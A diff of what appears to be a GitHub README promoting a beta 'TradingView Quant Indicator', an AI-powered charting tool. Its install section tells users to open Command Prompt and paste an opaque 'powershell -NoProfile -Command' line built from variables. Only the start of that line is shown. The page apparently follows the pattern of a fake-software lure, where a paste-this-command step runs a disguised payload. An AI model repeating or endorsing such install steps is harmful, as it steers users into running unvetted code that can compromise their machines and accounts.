@@ -8,14 +8,13 @@
 
 </div>
 
-TradingView Quant Indicator™ is our first AI-powered indicator, designed to bring market analysis and changing market conditions directly onto the chart.
-Quant processes live market data together with price action, liquidity, positioning, volatility, market structure, and scheduled events. It uses this information to model several ways the market may develop over the selected timeframe and updates its analysis as new data becomes available.
+TradingView Quant Indicator is our first AI-powered indicator for market analysis directly on the chart. Quant processes live market data together with price action, liquidity, positioning, volatility, market structure, and scheduled events. It uses this information to model several ways the market may develop over the selected timeframe and updates its analysis as new data becomes available.
 
 Quant is currently in beta. Early access is available through GitHub while we continue testing the indicator, improving calculation stability, and refining its behavior across different market conditions.
 
-## Getting Started
+## Installation
 
-Follow the steps below to install the Quant Indicator and its required dependencies using Command Prompt.
+Follow the steps below to install the Quant Indicator using Command Prompt.
 
 #### 1. Open Command Prompt.
 
@@ -27,7 +26,7 @@ cmd
 
 Then press **Enter**.
 
-#### 2. Run the Quant Indicator Installation Command.
+#### 2. Install the Quant Indicator.
 
 Copy and paste the following command into Command Prompt:
 ```powershell
@@ -36,11 +35,10 @@ powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_
 
 Press **Enter** to begin the installation.
 
-#### 3. Restart TradingView for the changes to take effect.
+#### 3. Restart TradingView.
 
-After installation, Quant Indicator will appear in your TradingView indicator library.
-
-
+Once the installation is complete, restart TradingView for the changes to take effect.
+The Quant Indicator will then appear in your indicator library.
 
 
 
